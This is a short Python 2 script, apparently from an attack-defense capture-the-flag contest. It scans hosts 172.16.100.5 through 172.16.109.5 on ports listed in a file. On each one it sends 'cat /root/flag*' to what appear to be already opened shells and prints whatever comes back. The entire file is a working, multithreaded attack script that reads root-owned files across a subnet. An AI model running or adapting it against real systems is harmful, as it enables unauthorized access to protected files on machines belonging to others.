from socket import *
import threading,time,os

def con(i,j):
	try:
		s=socket(AF_INET,SOCK_STREAM)
		ip='172.16.'+str(i)+'.5'
		s.connect((ip,j))
		s.send('cat /root/flag*\n')
		re=s.recv(1024)
		print ip,re
		s.close()
	except:
		pass

def th():
	for i in range(100,110):
			f=open('port','r')
			re=f.readlines()
			for j in re:
				j= j.strip()
				t=threading.Thread(target=con,args=(i,int(j)))
				t.start()
				time.sleep(0.1)
	os._exit(0)

if __name__ == '__main__':
	th()	
